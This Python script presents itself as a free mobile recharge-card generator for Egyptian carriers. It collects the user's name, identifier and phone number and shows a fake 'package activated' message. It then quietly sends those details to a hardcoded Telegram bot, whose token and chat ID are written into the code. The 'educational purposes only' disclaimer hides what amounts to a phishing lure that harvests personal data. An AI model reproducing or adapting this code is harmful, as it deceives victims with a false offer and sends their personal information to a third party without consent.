import pyfiglet
import getpass
import webbrowser
import time
import requests

Z = '\033[1;31m'  # Red
X = '\033[1;33m'  # Yellow
C = '\033[1;35m'  # Magenta
F = '\033[1;32m'  # Green
B = '\033[1;36m'  # Cyan

help_text = '''========================
== Script Help ==
========================

This script is used to renew free recharge cards.
Please follow the instructions and enter the required information.

1. You will be prompted to enter a password to proceed.
2. The password will be verified and if correct, the process will continue.
3. You will be asked for your name and mobile number.
4. The entered numbers will be verified and if correct, the process will continue.
5. You will be asked to enter the network name (vodafone, etisalat, etc.).
6. The available packages will be displayed based on the entered network.
7. You will be asked to choose the desired package.
8. The selected package will be activated.

Please note that this script is for educational purposes only and should not be used for any illegal activities.

========================
'''

developer_info = '''
========================
== Developer Info ==
========================

Script Developer: Engineer Abdelrahman Abdelsalam
Follow him on Facebook: https://www.facebook.com/Abdou1920304050
You cannot use the script without the developer's permission, otherwise it will be suspended.

========================
'''

def display_help():
    print('\033c')
    print(F + help_text)
    input("Press Enter to continue...")

def display_developer_info():
    print('\033c')
    print(F + developer_info)
    input("Press Enter to continue...")

def generate_user_code(identifier):
    code = ''
    for char in identifier:
        code += str(ord(char))
    return code

def send_to_telegram(user_data):
    bot_token = '6393646686:AAGI9RlsAQQ__iKfgjWlWcx5I76iWyse_AU'
    chat_id = '1716288434'
    message = f"User Code: {user_data['User Code']}\nName: {user_data['Name']}\nIdentifier: {user_data['Identifier']}\n{user_data['Data']}"

    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    data = {
        "chat_id": chat_id,
        "text": message
    }

    response = requests.post(url, data=data)
    if response.status_code == 200:
        pass  # Do nothing
    else:
        print("Failed to send message to Telegram.")

print(X + "Enter Your Password:")
password = getpass.getpass()

if password == 'Abdou':
    print(X + "Success Password")
    time.sleep(2)
    print("\033[2J\033[1;1H")

    identifier = input("Enter your identifier (phone number, name, etc.): ")

    user_code = generate_user_code(identifier)
    print(f"{X}Your unique user code: {user_code}")

    webbrowser.open("https://www.facebook.com/Abdou1920304050")

    # Help and Developer Info Buttons
    print("\n\033[1mPress (?) for help or (2) for developer info\033[0m")
    help_button = input()

    if help_button == '?':
        display_help()
    elif help_button == '2':
        display_developer_info()

    print("\033[2J\033[1;1H")

    print(f"{C}==================================")
    print(f"{C}Welcome to the free recharge cards section")
    print(f"{C}Developed by Engineer Abdelrahman Abdelsalam")
    print(f"{C}==================================")

    logo = pyfiglet.figlet_format("FASASA", font="slant")
    print(F + logo)

    print(f"{C}==================================")
    print()

    name = input("Enter your Name: ")
    print(B + f"\nYour Name Is: {name}")

    mobile_number = input("\nEnter your Mobile Number: ")
    confirm_number = input(F + "Confirm the mobile number: ")
    if mobile_number != confirm_number:
        exit(f'\n{Z}ERROR: Incorrect Number')

    print(C + "\nChoose the network:")
    print(f"{C}1. Vodafone")
    print(f"{C}2. Etisalat")
    print(f"{C}3. Orange")
    print(f"{C}4. WE")
    network = input(F + 'Enter the network name: ')
    if network.lower() == 'vodafone':
        if not mobile_number.startswith('010'):
            exit(f'\n{Z}ERROR: Invalid Vodafone number')
        print(f"{C}\n1. FLEX 25")
        print(f"{C}2. FLEX 35")
        print(f"{C}3. FLEX 50")
        print(f"{C}4. FLEX 30")
        print(f"{C}5. FLEX 45")
        print(f"{C}6. FLEX 70")
        print(f"{C}7. FLEX 100")
        print(f"{C}8. FLEX 200")
        flex_option = input(f"{F}\nEnter the desired package number: ")
        print(f"{C}\nThe selected package has been activated: FLEX {flex_option}")
    elif network.lower() == 'etisalat':
        if not mobile_number.startswith('011'):
            exit(f'\n{Z}ERROR: Invalid Etisalat number')
        print(f"{C}\n1. MEX 25")
        print(f"{C}2. MEX 35")
        print(f"{C}3. MEX 50")
        print(f"{C}4. MEX 30")
        print(f"{C}5. MEX 45")
        print(f"{C}6. MEX 60")
        print(f"{C}7. MEX 80")
        print(f"{C}8. MEX 120")
        print(f"{C}9. MEX 180")
        mex_option = input(f"{F}\nEnter the desired package number: ")
        print(f"{C}\nThe selected package has been activated: MEX {mex_option}")

    user_data = {
        "User Code": user_code,
        "Name": name,
        "Identifier": identifier,
        "Data": {
            "Mobile Number": mobile_number,
            "Network": network,
            "Package": flex_option if network.lower() == 'vodafone' else mex_option
        }
    }

    send_to_telegram(user_data)
